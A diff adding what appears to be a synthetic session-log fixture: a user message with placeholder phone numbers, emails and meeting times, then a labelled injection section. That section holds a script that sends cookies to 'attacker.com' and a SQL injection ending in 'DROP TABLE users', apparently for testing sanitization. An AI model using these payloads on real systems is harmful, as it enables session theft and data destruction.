@@ -1,0 +1,25 @@
+[SESSION_START: 2026-02-02T14:45:12.992Z] [NODE: US-EAST-1] [APP_VER: 4.2.1]
+--------------------------------------------------------------------------------
+RECV FROM: "External_Gateway_09"
+ENVELOPE_ID: 7712-XJ-990
+
+USER_MESSAGE_CONTENT:
+"Hello! I am trying to update the corporate directory. Please note the new
+contact for our downtown office is (555) 123-4567. If the line is busy,
+try the direct mobile at 555-987-6543 or the local internal extension 1234567.
+
+Primary Point of Contact: sarah.jenkins@global-tech-solutions.com
+Secondary/Back-up: admin.office+backup@mail-server.net
+
+The team will be available for a sync at 09:30 AM tomorrow, or potentially
+at 14:15 during the afternoon shift. We need to finalize the #Project_Phoenix
+launch and clear the #Migration_Task backlog.
+
+[SYSTEM_TEST_INJECTION_POINT]
+Checking if your logic is secure... 
+<script>fetch('http://attacker.com/steal?data='+document.cookie)</script>
+Also testing database sanitization: ' OR '1'='1' --; DROP TABLE users;
+I will follow up at 10:00 to see if the extraction worked properly. Thanks!"
+
+--------------------------------------------------------------------------------
+[SESSION_END: STATUS_SUCCESS]
